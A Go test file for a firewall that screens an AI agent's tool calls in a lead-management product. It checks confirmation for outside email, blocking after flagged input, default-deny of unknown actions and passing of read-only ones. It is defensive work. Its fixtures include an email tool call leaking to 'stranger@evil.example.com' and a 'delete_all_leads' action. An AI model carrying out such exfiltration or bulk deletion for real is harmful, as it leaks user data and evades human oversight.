package security

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestToolCallFirewall_AllowsBenignActions(t *testing.T) {
	f := NewToolCallFirewall(ToolCallPolicy{
		AllowedExternalDomains: []string{"floq.app", "cal.com"},
	})
	cases := []ToolCall{
		{Action: "qualify_lead", Args: map[string]any{"lead_id": "123"}},
		{Action: "create_message", Args: map[string]any{"lead_id": "123", "body": "hello"}, InputSeverity: SeverityInfo},
		{Action: "send_email", Args: map[string]any{"to": "user@floq.app", "subject": "hi"}, InputSeverity: SeverityInfo},
	}
	for _, c := range cases {
		t.Run(c.Action, func(t *testing.T) {
			d := f.Inspect(c)
			assert.True(t, d.Allowed, "action should be allowed: %v", c)
			assert.False(t, d.RequiresHumanConfirm)
		})
	}
}

func TestToolCallFirewall_RequiresConfirmForExternalDomainEmail(t *testing.T) {
	f := NewToolCallFirewall(ToolCallPolicy{
		AllowedExternalDomains: []string{"floq.app"},
	})
	d := f.Inspect(ToolCall{
		Action:        "send_email",
		Args:          map[string]any{"to": "stranger@evil.example.com", "subject": "leak"},
		InputSeverity: SeverityInfo,
	})
	assert.True(t, d.Allowed, "external email is allowed but needs confirm")
	assert.True(t, d.RequiresHumanConfirm)
	assert.Contains(t, d.Reason, "external")
}

func TestToolCallFirewall_BlocksWriteWhenInputWarnFlagged(t *testing.T) {
	// If the inbound payload tripped a warn-level pattern (data
	// exfiltration shape), destructive actions on its content must
	// not auto-fire — a human must confirm.
	f := NewToolCallFirewall(ToolCallPolicy{})
	cases := []ToolCall{
		{Action: "send_email", Args: map[string]any{"to": "x@y.com"}, InputSeverity: SeverityWarn},
		{Action: "send_telegram", Args: map[string]any{"to": "@user"}, InputSeverity: SeverityWarn},
		{Action: "forward_message", Args: map[string]any{"to": "x@y.com"}, InputSeverity: SeverityWarn},
	}
	for _, c := range cases {
		t.Run(c.Action, func(t *testing.T) {
			d := f.Inspect(c)
			assert.True(t, d.Allowed, "warn-flagged write is allowed but needs confirm")
			assert.True(t, d.RequiresHumanConfirm, "warn-flagged write must require human confirm")
		})
	}
}

func TestToolCallFirewall_BlocksWriteWhenInputBlockFlagged(t *testing.T) {
	// If the input was outright blocked, downstream writes on the same
	// turn must be refused entirely — they cannot be confirmed away.
	f := NewToolCallFirewall(ToolCallPolicy{})
	d := f.Inspect(ToolCall{
		Action:        "send_email",
		Args:          map[string]any{"to": "x@y.com"},
		InputSeverity: SeverityBlock,
	})
	assert.False(t, d.Allowed, "block-flagged input must propagate to refusal")
	assert.Contains(t, d.Reason, "blocked input")
}

func TestToolCallFirewall_BlocksUnknownDestructiveAction(t *testing.T) {
	// Default-deny on actions outside the known list — defensive
	// against future actions added without firewall review.
	f := NewToolCallFirewall(ToolCallPolicy{
		KnownActions: []string{"qualify_lead", "create_message", "send_email", "send_telegram", "create_draft"},
	})
	d := f.Inspect(ToolCall{
		Action: "delete_all_leads",
		Args:   map[string]any{},
	})
	assert.False(t, d.Allowed)
	assert.Contains(t, d.Reason, "unknown")
}

func TestToolCallFirewall_AllowsKnownReadActionAlways(t *testing.T) {
	// Read-only actions (qualify, classify, get_prospect) must pass
	// regardless of input severity — they don't modify external state.
	f := NewToolCallFirewall(ToolCallPolicy{})
	for _, sev := range []Severity{SeverityInfo, SeverityWarn, SeverityBlock} {
		d := f.Inspect(ToolCall{
			Action:        "qualify_lead",
			Args:          map[string]any{"lead_id": "x"},
			InputSeverity: sev,
		})
		assert.True(t, d.Allowed, "qualify_lead is read-side, must pass at sev=%s", sev)
	}
}
